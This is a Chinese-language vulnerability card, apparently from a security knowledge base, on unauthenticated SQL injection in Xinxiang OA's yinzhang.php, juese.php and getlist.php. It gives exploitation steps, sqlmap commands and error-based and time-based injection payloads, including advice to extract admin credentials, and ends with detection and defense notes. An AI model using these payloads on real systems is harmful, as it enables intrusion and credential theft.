---
id: web-generic-sqli-xinxiang-oa-missing-checklogin-like-injection
title: 新翔OA 多文件缺失 checklogin.php：yinzhang/juese/getlist 前台参数直拼 LIKE/LIMIT 致未授权 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: xinxiang-oa-missing-checklogin-like-concat-sqli
aliases:
- 新翔OA SQL注入
- OAsystem 前台注入
- yinzhang.php SQL 注入
- juese.php SQL 注入
- getlist.php zidian 注入
- 缺失 checklogin.php
tags:
- php
- sqli
- oa
- unauthenticated
- like
- string-concatenation
- mysql
- sqlmap
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V541
  verified_at: '2026-11-11T19:22:49+08:00'
  notes: 已对照原文与 16 张截图核对：图02 yinzhang.php 仅 include ../db.php 无 checklogin；图03 yinzhang GET 参数 danwei/jingban/leixing/sbianhao 直拼 LIKE '%$x%'（另有 cookie danweiid/quanxian 条件）；图06 juese.php 仅 include db.php、sjuese 拼 LIKE；图04/06/07/08 sqlmap 确认 yinzhang/juese/getlist(zidian&fenlei) error-based（GTID_SUBSET）与 time-based（SLEEP），OpenResty 1.15.8.1、PHP 7.3.8、back-end DBMS MySQL>=5.6；图05 qingjia.php 有 checklogin 且同款 LIKE/LIMIT 拼接，印证『同目录其他文件有鉴权』。修正：卡内触发条件『sqlmap 识别为 MySQL >= 5.0』按截图改为 MySQL >= 5.6。dedup：recommendation=new，仅与通用 LIKE 拼接卡、信呼 OA 未授权注入卡 related，产品/接口不同，非同一链；全库仅本卡含『新翔』；dup-scan 无本篇 pair。未验证点：未复现；limit 注入的 pindex/psize 运算链按原文与截图 qingjia.php 核对，yinzhang 对应行未完整截出。
---

## 一句话结论

新翔OA（OAsystem）有多个前台文件只 `include("../db.php")` 而没有 `include("../checklogin.php")`，因此无需登录即可访问；这些文件（如 `/manage/yinzhang.php`、`/system/juese.php`、`/Api/getlist.php`）把 GET 参数直接拼进 SQL 的 `LIKE '%$x%'`、`zidian='$x'` 与 `LIMIT` 中，未做过滤或参数化，造成未授权 SQL 注入，sqlmap 已确认 error-based 与 time-based（后端 MySQL，PHP 7.3.8/OpenResty）。

## 原理

- 鉴权缺失：`qingjia.php` 等文件会 `include("../checklogin.php"); if(!islogin()){ header("location:../index.php"); }`，而 `yinzhang.php`、`juese.php` 只 `include("../db.php")`，没有登录校验；同一目录下其他文件有鉴权，恰好说明这些文件是漏网之鱼。
- 字符串拼接（示例）：
  ```php
  $danwei=$_GET['danwei']; $jingban=$_GET['jingban'];
  $leixing=$_GET['leixing']; $sbianhao=$_GET['sbianhao'];
  $sql="SELECT * FROM ".$db->tablename('vyinzhang')." WHERE id>0";
  if($danwei!='')   { $sql=$sql." and danwei LIKE '%$danwei%'"; }
  if($jingban!='')  { $sql=$sql." and jingban LIKE '%$jingban%'"; }
  ...
  $psize = $_GET['limit'];                 // 直接进 LIMIT
  $sql=$sql." ORDER BY id asc LIMIT ".($pindex-1)*$psize.','.$psize;
  ```
  `LIKE '%$x%'` 外层虽包了 `%` 与单引号，输入一个 `'` 即可闭合模式串并注入；`limit` 甚至没有 `intval`，直接拼进 `LIMIT`。
- `juese.php`：`$key=$_GET['sjuese']; ... and juese like '%$key%'`；`/Api/getlist.php`：`switch($_GET['action']) case 'zidian': $zidian=$_GET['fenlei']; ... WHERE zidian='$zidian'`。
- 之所以成立：SQL 由字符串拼接构造，用户输入被当作 SQL 语法的一部分；外层引号/百分号不改变注入语义，参数化查询或强类型转换才能防御。

## 触发条件

- 目标为存在这些文件的新翔OA版本（原文测试环境 PHP 7.3.8/OpenResty 1.15.8.1，未给版本区间）。
- 对应文件可通过 Web 访问（`/manage/`、`/system/`、`/Api/`）。
- 文件未包含 `checklogin.php`（或鉴权函数可被绕过）。
- 数据库为 MySQL（sqlmap 识别 back-end DBMS 为 MySQL >= 5.6）。

## 利用步骤

1. 访问 `/manage/yinzhang.php?action=list&limit=1` 等页面，确认未登录也能返回数据（无跳转）。
2. 用单引号/布尔/时间盲注探测参数：`danwei`、`jingban`、`leixing`、`sbianhao`、`sjuese`、`fenlei`、`limit` 均可能注入。
3. sqlmap 验证并枚举：
   ```bash
   python sqlmap.py -u "http://target:8888/manage/yinzhang.php?action=list&danwei=1&limit=1" --threads=10
   python sqlmap.py -u "http://target:8888/system/juese.php?action=list&limit=1&sjuese=1" --threads=10
   python sqlmap.py -u "http://target:8888/Api/getlist.php?action=zidian&fenlei=1" --threads=10
   ```
4. 枚举库表，重点取用户表/管理员凭据，再结合登录绕过或口令复用进入后台。
5. 授权测试只读取最小数据，不写入。

## PoC

原文 sqlmap 确认的注入点（节选）：

```text
Parameter: #1* (URI)
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
Payload: http://192.168.19.25:8888/manage/yinzhang.php?action=list&danwei=' AND GTID_SUBSET(CONCAT(0x71,...),6018) AND 'eipg'='eipg&limit=1

Type: time-based blind
Payload: ...danwei=' AND (SELECT 1607 FROM (SELECT(SLEEP(5)))khGA) AND 'bObW'='bObW&limit=1
```

```text
http://192.168.19.25:8888/system/juese.php?action=list&limit=1&sjuese=1
http://192.168.19.25:8888/Api/getlist.php?action=zidian&fenlei=1
```

## 变体与关联

- 变体：同目录其他文件包含 `checklogin.php`，相同拼接逻辑在那里属于后台注入（需登录后利用）；本卡只列前台未授权点。
- 变体：`limit` 参数未 `intval`，可直接注入数字型/UNION/时间盲注；`action` 分发到其他 case 时还可能有别的拼接点（原文称“几个参数”）。
- 关联：[[web-generic-sqli-like-clause-append-search]]（通用 LIKE '%value%' 拼接注入）；[[web-generic-auth-xinxiang-oa-cookie-existence-login-bypass]]（同系统的 Cookie 存在性登录绕过，可配合注入拿到的数据）。
- 边界：文件补上 `checklogin.php`、SQL 改为参数化/预处理后失效；目标非 MySQL 时 payload 需调整。

## 检测与防御

- 检测：未登录访问 `/manage/yinzhang.php`、`/system/juese.php`、`/Api/getlist.php` 返回业务数据；参数中出现 `'`、`AND`、`SLEEP`、`GTID_SUBSET`、`UNION` 等特征；sqlmap 默认 UA/高频请求。
- 检测：代码审计关注 `include("checklogin.php")` 缺失的文件、`LIKE '%$x%'`、`WHERE x='$x'`、`LIMIT ...$psize` 等拼接模式。
- 防御：所有业务文件统一引入鉴权（或在入口路由统一拦截）；SQL 使用 PDO/预处理参数绑定，LIKE 用参数加转义；`limit`/`page` 强制 `intval` 与上限；最小权限数据库账户并开启审计。
